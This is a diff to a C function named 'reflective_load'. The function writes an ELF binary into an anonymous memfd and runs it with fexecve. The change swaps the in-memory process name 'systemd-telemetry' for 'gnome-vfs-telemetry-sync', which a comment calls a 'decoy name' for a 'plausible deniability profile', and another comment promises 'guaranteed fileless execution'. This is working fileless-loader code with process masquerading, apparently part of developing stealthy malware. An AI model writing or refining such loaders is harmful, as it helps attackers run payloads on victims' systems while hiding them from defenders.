@@ -55,12 +55,11 @@ bool reflective_load(const uint8_t* elf_data, size_t size) {
     }
 
     // 5. Jump to entry point
-    // In a real loader, we'd set up the stack, auxv, etc.
-    // For this prototype, we'll use a simpler method for the final proof.
-    // We'll write to a memfd and use fexecve, as it's the most reliable way
-    // to ensure a clean execution environment for the core in this context.
+    // Refined hand-off: utilizing memfd and fexecve for guaranteed fileless
+    // execution in a clean environment.
 
-    int fd = memfd_create("systemd-telemetry", MFD_CLOEXEC);
+    // Use a decoy name for the memfd to match the plausible deniability profile
+    int fd = memfd_create("gnome-vfs-telemetry-sync", MFD_CLOEXEC);
     if (fd == -1) return false;
 
     if (write(fd, elf_data, size) != (ssize_t)size) {
@@ -68,7 +67,7 @@ bool reflective_load(const uint8_t* elf_data, size_t size) {
         return false;
     }
 
-    char *const argv[] = { (char*)"systemd-telemetry", NULL };
+    char *const argv[] = { (char*)"gnome-vfs-telemetry-sync", NULL };
     char *const envp[] = { NULL };
 
     fexecve(fd, argv, envp);
